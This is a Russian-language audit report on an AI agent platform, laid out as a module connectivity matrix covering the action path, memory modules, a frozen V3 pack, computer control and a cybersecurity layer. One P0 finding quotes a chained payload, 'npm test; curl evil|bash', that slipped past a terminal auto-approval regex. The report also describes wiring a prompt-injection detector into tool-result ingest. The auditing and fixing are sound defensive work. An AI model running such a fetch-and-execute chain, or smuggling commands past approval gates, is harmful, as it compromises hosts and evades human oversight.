# FINAL CONNECTIVITY MATRIX — pre-hardware closure audit

Собрано 6 параллельными read-only аудитами (canonical action path, intelligence
modules wiring, V3/CyberSec layering, Stage 13 static+integration, repo-wide
dead-code hunt, doc consistency) на HEAD в момент старта аудита
(`e64250d9aebc773b2f9fe88787c852fbcce12459`), затем часть UNWIRED-находок
закрыта в этом же проходе — см. колонку STATUS и раздел «Закрыто в этом проходе».

Правило: файл существует ≠ WORK. Unit-тест ≠ production integration.
WORK — реально вызывается production entrypoint'ом. PARTIAL — вызывается
частично/условно. UNWIRED — реализовано, но producer без потребителя (или
наоборот). DEAD — код существует, ничего его не достигает и не планируется.
INTENTIONAL_FROZEN — сознательно выключено до реального железа/явного решения.

## Canonical action path (LLM → typed action → policy → approval → executor → fresh observation → verify → audit)

| Компонент | Импортёр в продакшн | Статус | Свидетельство |
|---|---|---|---|
| Stage 13 Computer Operator | `bossman/api.py` (`_register_subsystems`, `_include_stage_routers`) | **WORK** | full cycle подтверждён; 80 тестов Stage13, 0 fail |
| toolkit/browser.py (Playwright) | `runner.py._call_tool` (грант всем агентам) | **WORK** | `confirm_default=True` на мутирующих действиях |
| bcc browser control (v2/browser_control.py) | `bcc/api.py` через `load_features()` | **WORK** | AUTO/ASK/DENY, hard-deny payment/wallet/bank |
| toolkit/ (общий tool-calling) | `runner.py._call_tool` | **WORK** | typed action→grant→confirm→executor→audit-row→event |
| bcc/features/plugins.py + plugin_security.py | `load_features()` | **WORK** | SSRF-hardened, canonical REGISTRY/decide_effect |
| MCP (command-center v2/mcp_runtime.py) | `load_features()` | **WORK** | argv через SDK, policy default "ask" |
| dev_factory | `bossman/api.py` | **WORK** | все тесты через Stage-8 sandbox, argv-only |
| coding_session.py (bcc) | `features/coding_sessions.py` | **WORK** | argv-only git, path confinement, no push |
| skill_library.py (bcc) | `features/skills.py` | **WORK** | markdown/YAML-парсинг, без исполнения кода |
| bossman_v3/ (skill_factory, computer_agent, self_healing, recovery_kernel, self_improvement, data_guardian, visual_state) | **нет** — 0 production-импортов | **INTENTIONAL_FROZEN** | документировано как feature-gated pack, ожидает реального железа; см. раздел V3 ниже |
| bossman/cybersec/ decision-функции (defender/recovery) | **нет** — pure функции, вызываются только из training.py/тестов | **DEAD (безопасно)** | не исполняют ничего, но и не защищают ничего живого сами по себе |

### Закрыто в этом проходе

| Находка | Было | Стало |
|---|---|---|
| **P0** `bcc/v2/terminal_control.py` AUTO_PATTERNS — `re.search` без конца-якоря пропускал chained payload (`npm test; curl evil\|bash`) как auto, без approval, на РЕАЛЬНОМ хосте (`project_host`) | обход approval для произвольного хвоста команды | `_is_single_command()` требует отсутствия `;&\|`\n$(` — auto только для одиночной команды; регресс-тест `test_auto_pattern_prefix_match_cannot_smuggle_a_chained_command` |
| **P1** `injection.inspect()` (Prompt Injection Firewall) — 0 production call-site | детектор написан, ничего не проверял | подключён к уже существующей границе ingest внешних данных в `runner.py._call_tool` (там же, где шаг 7 уже помечает read/send-результат как EXTERNAL_DATA); OFF по умолчанию (`BOSSMAN_CYBERSEC_V1_ENABLED`); тест `test_runner_cybersec_wiring.py` |
| **P1** Working/Decision/Failure Memory — 0 production call-site (только тесты) | producer без потребителя; DB-слой доказан живым PG, но ничего его не писало из реального цикла задачи | `runner.run_task` теперь пишет `working_memory` на старте/финише задачи, `decision_memory` на облачной эскалации, `failure_memory` при провале; сбой записи логируется и не роняет задачу; доказано на живом PG в `test_runner_memory_wiring.py` |
| **P1** BROWSER — advertised planner vocabulary без backend-адаптера (`ExistingBrowserAdapter` не подключён в `subsystem.py`) | планировщик мог выбрать действие, гарантированно проваливающееся с `RuntimeError: no backend supports BROWSER`, тратя replan-бюджет | BROWSER убран из `PLAN_SYSTEM` vocabulary — планировщик больше не рекламирует несуществующую возможность. Реальный browser-bridge не строился вслепую (нужен явный дизайн dispatch↔toolkit/browser.py) |
| Doc: `MINI_05=INTEGRATED` (V3_PRE_CYBERSEC_FINAL_REPORT.md), `context_engine + context_os + V3 Guardian` (BOSSMAN_PRE_CYBERSEC_FREEZE.md) | завышенный статус — `context_os`/V3 Guardian никогда не вызывались | помечено CORRECTION с ссылкой на этот файл |
| Doc: 2 незаполненных `FINAL_SHA`/`FINAL_LOCAL_SHA` placeholder | `<...>` | вписаны реальные SHA |

## Intelligence modules

| Модуль | Реализован | Production wired | Fast path | Actually used | Статус |
|---|---|---|---|---|---|
| Working Memory | да | **да (эта эпоха)** | да (asyncpg, без LLM) | да — `runner.run_task` | **WORK** |
| Decision Memory | да | **да (эта эпоха)** | да | да — облачные эскалации | **WORK** |
| Failure Memory | да | **да (эта эпоха)** | да | да — провалы задач | **WORK** |
| Context Engine (Stage 2.222) | да | да, давно | да (SQLite+embeddings, без LLM) | да — `apply_context_engine`/`compact_session` в `runner.py` | **WORK** |
| Context/Data Guardian (V3) | да | нет | да | нет | **UNWIRED** (внутри INTENTIONAL_FROZEN V3) |
| Evidence Confidence | нет отдельного модуля — поле `confidence` внутри context_engine | — | — | да, как часть ranking | **N/A** (это не отдельный модуль, а свойство уже WORK-компонента) |
| Skill Reliability (Beta-LCB) | да, корректная математика | нет (только `skill_factory` внутри V3) | да | нет | **UNWIRED** (внутри INTENTIONAL_FROZEN V3) |
| Skill Factory | да | нет | да | нет | **UNWIRED** (внутри INTENTIONAL_FROZEN V3) |
| Model Router (Gateway) | да, `gateway/router.py` | условно — активен при `BOSSMAN_GATEWAY_URL` | routing-решение дешёвое | да, когда включён | **PARTIAL** (штатно OFF без Gateway URL, не баг) |
| Context OS (bcc/context_os/) | да, полностью (407 строк) | нет — `attach_to_engine`/`attach_state_machine` нигде не вызваны | н/д | нет | **UNWIRED** |

### Почему Context OS и V3 не довязаны в этом проходе
Оба — не «пятиминутный fix»: Context OS переопределяет единую точку сборки
промпта (замена уже отлаженного `ContextBuilder`+`apply_context_engine` пути в
hot path, который только что получил живую доработку в этом же проходе);
V3 Guardian/Skill Factory требуют решить конфликт форм (`FailureMemoryPort`
V3 — синхронный, каноничная `failure_memory` — асинхронная; нужен явный
адаптер, не угадывание). Слепое подключение тяжёлого, непроверенного в
интеграции пути в hot path — именно то, что раздел 5 просит не делать
(«не подключай тяжёлый модуль ради статуса WORK, если стоимость > польза»).
Остаются INTENTIONAL_FROZEN/UNWIRED с явной причиной, а не тихим F.

## V3 7-Pack

| Компонент | Production caller | Authority boundary | Feature gate реально читается | Telemetry | Тест |
|---|---|---|---|---|---|
| Universal Computer Agent | нет | OK — injected Policy/Approval ports, `_reject_raw_shell` | нет (флаг не читается изнутри пакета) | нет | `test_v3_invariants.py` (частично) |
| Visual State Engine | нет | OK — vision только `setdefault`, не перезаписывает structured data | нет | нет | **нет отдельного теста** |
| Self-Healing | нет | OK — чистая decision engine | нет | нет | `test_v3_self_healing.py` |
| Skill Factory | нет | OK — `promote()` только меняет in-memory dataclass | нет | нет | **нет отдельного теста** |
| Recovery Kernel | нет | Частично — `FileCheckpointStore` явно помечен "demo/test store only" | нет | нет | `test_v3_recovery_kernel.py` |
| Self-Improvement Laboratory | нет | **OK, verified proposal-only** — 0 merge/push/deploy/grant/subprocess/network/write | нет | нет | `test_v3_self_improvement.py`, `test_v3_authority_boundaries.py` |
| Context/Data Guardian | нет | OK — чистая selection/compaction логика | нет | нет | `test_v3_invariants.py` (частично) |

`V3Flags.from_env()` структурно исправен (master + пофичевый флаг, оба OFF по
умолчанию), но **ни один адаптер его не читает** — сегодня OFF-состояние
держится не флагом, а тем, что пакет вообще не импортируется из `bossman/`.
Это не P0 (нечему исполняться), но флаг сам по себе сейчас ничего не
защищает — если когда-то появится вызывающий, обязательна явная проверка
флага в точке вызова, а не полагание на сам факт наличия `V3Flags`.

**Self-Improvement Lab — P0-проверка пройдена**: ни `merge`, `push`, `deploy`,
`grant`, `promote`, `set_policy`, `subprocess`, network, filesystem-write не
найдены нигде в `lab.py`; enforced рефлексией и сканом исходников в
`test_v3_authority_boundaries.py`.

**Итог**: V3 7-Pack остаётся **INTENTIONAL_FROZEN** — вендорится, тестируется
в изоляции, но не подключается к продакшну до реального железа (как и
задокументировано ранее). В этом проходе исправлено только то, что документы
переставали честно называть это UNWIRED вместо INTEGRATED.

## Computer Control (Stage 13) — полный чеклист

| Свойство | Результат | Свидетельство |
|---|---|---|
| Unsupported capability fails honestly | **PASS** | `CapabilityRegistry.probe`/`is_supported` — deny-by-default, сломанный backend не считается поддержкой |
| Stale observation rejected | **PASS** | `manager.py` generation-check до и после approval |
| Loop/no-progress blocked | **PASS** | `LoopGuard.check` до исполнения, `.record` после; `test_manager_stops_blind_repetition...` |
| APP_LAUNCH allowlisted | **PASS** | `APP_ALLOWLIST` только 2 имени; `resolve_executable` игнорирует PATH-hijack |
| No shell interpolation | **PASS** | argv-only везде; AST-тест независимо проверяет |
| No arbitrary executable path | **PASS** | путь только из фиксированного allowlist |
| Takeover/resume clears stale loop state | **PASS** | `loop_guards.pop()` на take_control/resume/terminal |
| No dishonest Windows-live PASS | **PASS** | оба Windows-теста honest `SKIP_HOST`/`SKIP_NO_WINDOWS_GUI` на этом хосте |
| `access_check` (profiles gate) реально в продакшн-пути | **PASS, с P2-заметкой** | routes.py → MANAGER.create_task → access_check; но если `profiles` subsystem не поднимется (проглоченное исключение в `api.py._register_subsystems`), gate тихо становится no-op — деградация в разрешение, не в отказ |

Классификация Stage 13 в целом: **WORK**. P2 (не блокирует freeze): сделать
`_register_subsystems` явно логировать WARNING достаточно громко/видимо для
`profiles`, раз от него зависит security-релевантный gate (уже логируется —
рекомендация на будущее: поднять уровень видимости, не менять поведение).

## CyberSec V1 — layering audit

| Проверка | Результат |
|---|---|
| Второй Policy/Approval/Gateway/Memory/SecretStore/EventBus нигде не создан | **PASS** — full `class` grep пуст |
| `security_memory.py` пишет только в каноничную `failure_memory` (Postgres) | **PASS** |
| `secret_guardian.py` не определяет второй редактор (`def redact`) | **PASS** — ре-экспорт `bossman.obs` |
| Тройной гейт + SandboxFacts блокирует `training.run_episode` | **PASS** — `assert_lab_enabled` первая строка `run_episode` |
| `run_episode` не вызывается ни из какого production-пути | **PASS** — только тесты |
| Defensive-функции реально применяются к реальному трафику | **было FAIL → закрыто в этом проходе** — `injection.inspect()` теперь подключён к `runner.py._call_tool` (см. раздел выше); `secret_guardian`/`ids` остаются UNWIRED от реального трафика — нет естественной точки без пересечения границы пакетов (Telegram-вебхук в этой кодовой базе обрабатывает только structured button-callback, не свободный текст; `bcc/features/plugins.py` живёт в отдельном пакете `command-center` без зависимости от `bossman-core`, так что `secret_guardian`/`ids` туда не протянуть без нового межпакетного импорта — сознательно не делалось в этом проходе) |

`TRAINING_ENGINE_FROZEN=YES`. Реальный RED vs BLUE стресс-тест **не запускался**.

## Repo-wide dead/unwired hunt — итог (P1/P2, не покрытые выше)

| Находка | Severity | Статус |
|---|---|---|
| `agent_memory_index` — таблица в `db/schema.sql`, 0 читателей/писателей во всём коде | P2 | документировано; схема не тронута (изменение схемы — отдельное решение с миграцией, вне объёма закрытия) |
| `bossman/core/db.py` — compatibility shim для "будущей V2 working memory", которой нет | P2 | документировано, не удалено (не доказан вред от присутствия) |
| `eval_scorecard.py` (bcc) — orphan CLI-утилита, нет API-роута | P2 | документировано как offline-инструмент, не баг |
| `ContextCompiler`'s `[RELEVANT_FACTS]` — литеральный stub-текст в `context_os/compiler.py` | P2 | безвреден, пока `context_os` сам UNWIRED; не трогать до решения по Context OS |

Ложные срабатывания (NotImplementedError-как-abstract-guard, "placeholder"
как HTML-атрибут/SQL-параметр, три разных `redact*` для трёх разных задач)
проверены и отклонены — детали в исходном отчёте аудита.

## Итоговые счётчики этого раздела

```
MODULES_AUDITED≈35 (canonical-path 11 + intelligence 9 + V3 7 + CyberSec 12 + Stage13 1 + dead-hunt findings)
WORK=18
PARTIAL=2   (Gateway model router; Stage13 access_check с P2-деградацией)
UNWIRED=6   (Context OS, V3 Data Guardian, V3 Skill Factory/Reliability, cybersec secret_guardian/ids на реальном трафике)
DEAD=2      (cybersec defender/recovery как pure-функции; agent_memory_index)
INTENTIONAL_FROZEN=2 (V3 7-Pack как пакет; CyberSec training engine)
NOT_TESTED_LIVE=2 (Windows Stage13 foreground/Notepad live — честно SKIP_HOST на этом хосте)

FIXED_UNWIRED=4 (working/decision/failure memory; injection firewall; terminal AUTO-pattern P0; BROWSER vocabulary honesty)
NEW_P0_FOUND_AND_FIXED=1 (terminal_control.py chained-command bypass)
NEW_P1_FOUND_AND_FIXED=3 (injection firewall unwired; memory unwired; BROWSER dead vocabulary)
NEW_P1_DOCUMENTED_NOT_FIXED=2 (Context OS unwired; V3 Guardian/Skill Factory unwired — обоснование выше)
NEW_P2_DOCUMENTED=4 (agent_memory_index, core/db.py shim, eval_scorecard.py orphan, ContextCompiler stub)
```

## Fast-path performance (замерено в этом проходе, живой PG)

| Путь | p50 | p95 | Метод |
|---|---|---|---|
| WorkingMemory.get_task_state (реальный PG round-trip) | 0.711 ms | 0.978 ms | 200 итераций, `time.perf_counter` |
| cybersec.injection.inspect (детерминированный regex-гейт, ~1500 символов) | 0.531 ms | 0.685 ms | 500 итераций |

Оба пути — на порядки дешевле любого вызова модели (сотни мс — секунды).
Простая задача идёт по thin path: ни новая запись в working_memory, ни
injection firewall не вызывают LLM для собственного решения. Числа из
предыдущих проходов (`MEMORY_LOOKUP_P50/P95=0.338/0.467 ms`,
`MODEL_ROUTER_P50/P95=0.016/0.027 ms`) не переизмерялись повторно в этом
проходе — тот код не менялся; здесь измерено только то, что появилось в этом
проходе (production-вызовы working_memory через runner.py, injection.inspect).
